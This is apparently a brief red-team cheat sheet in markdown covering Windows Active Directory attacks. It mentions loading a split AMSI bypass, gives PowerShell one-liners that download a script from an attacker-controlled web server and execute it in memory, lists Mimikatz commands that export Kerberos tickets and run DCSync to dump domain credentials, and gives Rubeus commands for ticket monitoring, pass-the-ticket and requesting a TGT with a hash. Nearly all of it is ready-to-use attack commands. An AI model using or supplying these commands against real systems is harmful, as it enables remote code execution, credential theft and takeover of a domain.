Bypass folder of web server will have AMSI bypass splitted and loaded in parts, then, run whatever payload chosen.
### Powershell useful commands
```
# Load script to memory
(New-Object System.Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1') | iex
IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')
```

### Mimikatz
```
# Export Kerberos tickets from memory
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'
# DCSync:
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:infinity.com /all"'
```

### Rubeus
```
# Monitor Kerberos tickets on unconstrained delegation machine
Invoke-Rubeus -Command "monitor /internal:5"
# Load Kerberos ticket:
Rubeus.exe ptt /ticket:base64
# Ask TGT:
.\Rubeus.exe asktgt /user:administrator /domain:infinity.com /rc4:5f9163ca3b673adfff2828f368ca3760 /ptt
```


